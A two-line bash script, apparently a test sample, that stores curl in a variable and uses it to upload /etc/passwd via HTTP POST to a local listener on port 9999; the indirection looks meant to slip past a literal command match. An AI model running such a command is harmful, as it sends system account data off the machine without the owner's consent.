#!/bin/bash

dl=curl
"$dl" -X POST -F f=@/etc/passwd localhost:9999
